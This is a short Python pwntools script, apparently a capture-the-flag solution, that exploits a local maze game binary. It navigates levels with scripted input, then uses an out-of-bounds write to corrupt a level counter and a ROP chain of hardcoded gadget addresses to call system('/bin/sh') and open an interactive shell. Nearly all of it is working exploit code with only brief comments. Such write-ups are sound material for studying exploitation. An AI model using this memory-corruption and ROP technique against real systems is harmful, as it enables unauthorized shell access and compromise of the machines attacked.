from pwn import *
io = process("./maze")
io.sendline()

# reach level 5
p = b's\ns\nd\ns\ns\nd\nd\ns\ns\nd\nd\nw\nw\nd\nd\nw\nw\nd\nw\nw\nd\nd\ns\ns\nd\ns\ns\na\na\ns\ns\ns\nd\nd\ns\nd\nd\ns\ns\ns\na\ns\ns\nd\n'
for _ in range(3):
    io.send(p)
io.sendline(b"."*160+b"ssdddwwdddssdssssassasssdddddssdddd")
io.sendline(b"."*70+b"ssdddwwdddssdssssassasssdddddssdddaaaaa")

"""
    if ((((global_count == 10) && (player_y == 14)) && (player_x == 8)) &&
      (4 < clear_count)) {
     sus_byte = 0x30;
   }
"""

# Out Of Bounds
io.sendline(b"OPENSESAMI")
# 0x00602244-0x00602218 (magic wall) = 44
# overwrite a byte in 0x00602244 (level count) with '0'(0x30),
# record our name and ROP ASAP to system("/bin/sh")
io.sendline(b"s"*3+b"d"*12+b"a"*12+b"w"*3+b"d"*6+b"Man, Korn surely is amazing!"*2+p64(0x004017c3)+p64(0x004017b4))
io.interactive()
